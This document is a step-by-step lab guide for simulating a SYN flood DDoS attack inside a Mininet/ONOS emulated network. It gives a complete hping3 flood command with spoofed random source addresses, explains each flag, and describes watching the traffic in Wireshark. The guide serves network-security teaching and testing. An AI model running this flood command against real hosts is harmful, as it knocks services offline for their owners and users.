#! DDoS attack: Network Attack Simulation
Ensure that the mininet topology with the ONOS controller have been started.


#1. Verify the network connectivity
$ pingall

#2. Download packages from all configured sources
$ sudo apt-get update

#3. Install hping3 tool
$ sudo apt-get install hping3

#4. Open the host terminal of the attacker
$ xterm <hostname>

#5. Check the ip address.
$ ifconfig
- verify the ip address is correct. 

#6. Open terminal for the destination, open wireshark and monitor the current conditions
$ xterm <hostname>
$ wireshark

#7. Run the hping3 attack command on the attacker host terminal
$  sudo hping3 -c 10000 -d 20 -S -w 64 -p 80 --flood --rand-source <IP_ADDRESS_TARGET>

- -c 10000 shows the number of packets being sent.
- -d 20 display the packet data size of 20 bytes
- -S is the SYN flag in the TCP header
- -w 64 is the TCP window size
- -p 80 is the target port 80 (normally used for HTTP)
- --flood sends the packets as fast as possible
- --rand-source uses the random source IP addresses
- <IP_ADDRESS_TARGET> is the target IP address

- this command sends 10000 packets with a load of 20 bytes to the target host at port 80.
- It uses a SYN flood simulation with random source IP addresses

#8. Monitor attack on Wireshark
- Monitor the incoming traffic which shows the SYN Flood with the random source IP address
- Increase in traffic is visible on Wireshark of the target host
